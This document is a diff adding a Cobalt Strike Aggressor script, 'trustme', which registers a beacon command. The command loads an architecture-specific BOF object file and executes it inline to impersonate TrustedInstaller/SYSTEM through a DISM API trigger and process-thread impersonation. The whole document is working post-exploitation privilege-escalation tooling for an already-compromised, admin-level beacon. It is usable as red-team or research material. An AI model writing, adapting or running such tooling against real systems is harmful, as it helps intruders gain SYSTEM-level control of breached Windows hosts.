@@ -1,0 +1,38 @@
+#
+# trustme.cna - Aggressor script for the TrustedInstaller impersonation BOF
+#
+# Usage: trustme
+#   Requires: Admin beacon with SeDebugPrivilege available
+#   Revert:   rev2self
+#
+
+beacon_command_register(
+    "trustme",
+    "Impersonate TrustedInstaller via DISM API trigger and thread impersonation.",
+    "Synopsis: trustme\n\nElevates the current beacon thread to TrustedInstaller/SYSTEM context.\nUses the DISM API to start TrustedInstaller.exe without touching SCM,\nthen walks processes via NtGetNextProcess and impersonates a thread.\n\nRequires: Elevated (admin) beacon.\nRevert:   rev2self"
+);
+
+alias trustme {
+    local('$barch $handle $data $args');
+
+    # Verify the beacon is in an elevated context
+    if (!-isadmin $1) {
+        berror($1, "trustme requires an elevated (admin) beacon.");
+        return;
+    }
+
+    # Determine architecture and load the correct object file
+    $barch = barch($1);
+    $handle = openf(script_resource("trustme. $+ $barch $+ .o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    if (strlen($data) == 0) {
+        berror($1, "Could not read trustme. $+ $barch $+ .o, is the object file in the same directory as this script?");
+        return;
+    }
+
+    # No arguments needed for this BOF
+    btask($1, "Attempting to impersonate TrustedInstaller via DISM...");
+    beacon_inline_execute($1, $data, "go", $null);
+}
